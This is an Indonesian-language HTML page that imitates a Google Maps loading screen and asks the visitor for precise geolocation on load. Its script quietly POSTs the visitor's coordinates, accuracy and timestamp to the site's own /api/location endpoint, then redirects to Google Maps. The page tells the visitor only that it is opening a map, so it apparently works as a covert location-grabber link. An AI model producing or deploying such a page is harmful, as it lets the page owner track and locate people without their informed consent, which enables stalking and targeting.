<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Membuka Peta Lokasi...</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      width: 100%;
      font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
      background: #e8eaed;
      overflow: hidden;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    /* Background pattern menyerupai peta */
    .bg-pattern {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        linear-gradient(145deg, #d2e3fc 0%, #e6f0fa 30%, #f8f9fa 70%, #e8eaed 100%);
      z-index: 0;
    }

    .bg-pattern::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(255,255,255,0.7) 0%, transparent 25%),
        radial-gradient(circle at 80% 70%, rgba(255,255,255,0.5) 0%, transparent 30%),
        linear-gradient(90deg, rgba(200,200,200,0.15) 1px, transparent 1px),
        linear-gradient(rgba(200,200,200,0.15) 1px, transparent 1px);
      background-size: 100% 100%, 100% 100%, 40px 40px, 40px 40px;
      opacity: 0.5;
    }

    /* Kartu loading */
    .loading-card {
      position: relative;
      z-index: 2;
      background: white;
      border-radius: 24px;
      padding: 40px 32px;
      text-align: center;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
      max-width: 400px;
      width: 90%;
      animation: fadeIn 0.5s ease-out;
    }

    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    .location-icon {
      width: 80px;
      height: 80px;
      background: #1a73e8;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 24px;
      box-shadow: 0 6px 14px rgba(26, 115, 232, 0.35);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.05);
      }
    }

    .location-icon span {
      font-size: 40px;
      line-height: 1;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
    }

    h1 {
      font-size: 1.5rem;
      font-weight: 500;
      color: #202124;
      margin-bottom: 12px;
      line-height: 1.3;
    }

    .status-text {
      color: #5f6368;
      font-size: 0.95rem;
      line-height: 1.6;
      margin-bottom: 20px;
    }

    .loading-spinner {
      width: 40px;
      height: 40px;
      border: 4px solid #e8eaed;
      border-top: 4px solid #1a73e8;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .error-message {
      color: #d93025;
      font-size: 0.9rem;
      margin-top: 16px;
      display: none;
    }

    .error-message.show {
      display: block;
    }
  </style>
</head>
<body>
  <!-- Background peta -->
  <div class="bg-pattern"></div>

  <!-- Kartu loading -->
  <div class="loading-card" id="loadingCard">
    <div class="location-icon">
      <span>📍</span>
    </div>
    <h1 id="titleText">Mendeteksi Lokasi...</h1>
    <div class="status-text" id="statusText">
    </div>
    <div class="loading-spinner" id="spinner"></div>
    <div class="error-message" id="errorMessage"></div>
  </div>

  <script>
    (function() {
      // Fungsi untuk update UI
      function updateUI(title, status, showSpinner = true, showError = false, errorMsg = '') {
        document.getElementById('titleText').textContent = title;
        document.getElementById('statusText').textContent = status;
        
        const spinner = document.getElementById('spinner');
        spinner.style.display = showSpinner ? 'block' : 'none';
        
        const errorElement = document.getElementById('errorMessage');
        if (showError) {
          errorElement.textContent = errorMsg;
          errorElement.classList.add('show');
        } else {
          errorElement.classList.remove('show');
        }
      }

      // Fungsi untuk redirect ke Google Maps
      function redirectToGoogleMaps(latitude, longitude) {
        // Update UI sebelum redirect
        updateUI('Lokasi Ditemukan!', 'Membuka Google Maps...', true);
        
        // Buat URL Google Maps
        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=17`;
        
        // Redirect setelah delay singkat
        setTimeout(() => {
          window.location.href = mapsUrl;
        }, 800);
      }

      // Fungsi untuk mengirim lokasi ke server (opsional)
      function sendLocationToServer(latitude, longitude, accuracy) {
        const payload = {
          latitude: latitude,
          longitude: longitude,
          accuracy: accuracy,
          timestamp: new Date().toISOString()
        };

        // Kirim ke server (tidak blocking)
        fetch('/api/location', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        }).catch(err => {
          // Abaikan error - lokasi tetap diproses
          console.log('Server save optional:', err.message);
        });
      }

      // Fungsi utama untuk meminta lokasi
      function requestLocation() {
        if (!navigator.geolocation) {
          updateUI('Browser Tidak Mendukung', 'Browser Anda tidak mendukung geolokasi', false, true, 'Silakan gunakan browser modern seperti Chrome, Firefox, atau Safari.');
          return;
        }

        // Update UI untuk meminta izin
        updateUI('Mendeteksi Lokasi...', 'Mohon izinkan akses lokasi pada pop-up browser', true);

        // Minta lokasi dengan timeout
        navigator.geolocation.getCurrentPosition(
          (position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const accuracy = position.coords.accuracy;

            // Kirim lokasi ke server (opsional, tidak blocking)
            sendLocationToServer(latitude, longitude, accuracy);

            // Redirect ke Google Maps
            redirectToGoogleMaps(latitude, longitude);
          },
          (error) => {
            let errorMessage = '';
            
            switch(error.code) {
              case error.PERMISSION_DENIED:
                errorMessage = 'Izin lokasi ditolak. Silakan aktifkan izin lokasi di browser Anda.';
                break;
              case error.POSITION_UNAVAILABLE:
                errorMessage = 'Lokasi tidak tersedia. Periksa koneksi internet atau GPS Anda.';
                break;
              case error.TIMEOUT:
                errorMessage = 'Waktu permintaan lokasi habis. Silakan coba lagi.';
                break;
              default:
                errorMessage = 'Terjadi kesalahan saat mengambil lokasi.';
            }
            
            updateUI('Gagal Mendapatkan Lokasi', 'Tidak dapat mengakses lokasi Anda', false, true, errorMessage);
          },
          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          }
        );
      }

      // Mulai permintaan lokasi saat halaman dimuat
      window.addEventListener('load', () => {
        // Delay kecil untuk memastikan UI terlihat
        setTimeout(() => {
          requestLocation();
        }, 500);
      });

      // Fallback jika load event sudah terlewati
      if (document.readyState === 'complete') {
        setTimeout(requestLocation, 500);
      }
    })();
  </script>
</body>
</html>
